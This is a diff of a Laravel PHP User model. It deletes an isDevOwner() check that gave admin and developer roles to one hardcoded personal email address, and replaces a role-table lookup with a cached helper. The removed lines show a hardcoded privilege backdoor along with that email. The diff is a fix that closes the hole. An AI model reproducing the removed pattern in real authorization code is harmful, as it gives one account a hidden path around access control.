@@ -8,6 +8,7 @@ use Illuminate\Database\Eloquent\Relations\HasMany;
 use Illuminate\Database\Eloquent\Relations\HasOne;
 use Illuminate\Foundation\Auth\User as Authenticatable;
 use Illuminate\Notifications\Notifiable;
+use Illuminate\Support\Facades\Cache;
 use Illuminate\Support\Facades\Schema;
 
 class User extends Authenticatable
@@ -166,15 +167,11 @@ class User extends Authenticatable
             ->unique()
             ->values();
 
-        if ($this->isDevOwner() && $requested->intersect(['admin', 'super_admin', 'dev', 'developer'])->isNotEmpty()) {
-            return true;
-        }
-
         if ($requested->contains((string) $this->role)) {
             return true;
         }
 
-        if (! Schema::hasTable('roles') || ! Schema::hasTable('role_user')) {
+        if (! static::roleTablesExist()) {
             return false;
         }
 
@@ -187,8 +184,10 @@ class User extends Authenticatable
         }
     }
 
-    public function isDevOwner(): bool
+    protected static function roleTablesExist(): bool
     {
-        return strtolower((string) $this->email) === 'jameskoen78@gmail.com';
+        return Cache::driver('array')->rememberForever('users.role_tables_exist', function (): bool {
+            return Schema::hasTable('roles') && Schema::hasTable('role_user');
+        });
     }
 }
